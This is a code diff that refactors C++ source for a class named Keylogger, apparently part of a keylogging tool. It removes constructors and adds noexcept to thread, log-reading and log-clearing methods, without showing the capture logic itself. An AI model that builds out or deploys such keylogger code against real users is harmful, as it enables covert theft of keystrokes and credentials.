@@ -15,28 +15,14 @@
 
 using namespace methods::keylogger;
 
-Keylogger::Keylogger(IKeyloggerImplementation *implementation)
-    : m_implementation(implementation)
-{
-    m_threadRunning = false;
-}
-
 Keylogger::~Keylogger()
 {
     StopThread();
-
-    delete m_implementation;
-}
-
-Keylogger::Keylogger(
-    Keylogger& other)
-{
-    m_implementation = other.m_implementation;
-    other.m_implementation = nullptr;
 }
 
 void
 Keylogger::StartThread()
+noexcept
 {
     if ( true == m_threadRunning )
         return;
@@ -48,6 +34,7 @@ Keylogger::StartThread()
 
 void
 Keylogger::StopThread()
+noexcept
 {
     if ( false == m_threadRunning )
         return;
@@ -60,6 +47,7 @@ Keylogger::StopThread()
 
 void
 Keylogger::ClearLog()
+noexcept
 {
     if ( m_threadRunning )
     {
@@ -77,6 +65,7 @@ Keylogger::ClearLog()
 
 uint32_t
 Keylogger::LogSize()
+noexcept
 {
     const char *file_name = m_implementation->GetFileNameC();
 
@@ -88,6 +77,7 @@ uint32_t
 Keylogger::GetLog(
     char *buffer,
     uint32_t buffer_len)
+noexcept
 {
     uint32_t read_len = std::min(buffer_len, LogSize());
 
@@ -102,6 +92,7 @@ Keylogger::GetLog(
 
 void
 Keylogger::KeylogThread()
+noexcept
 {
     m_threadOut = false;
 
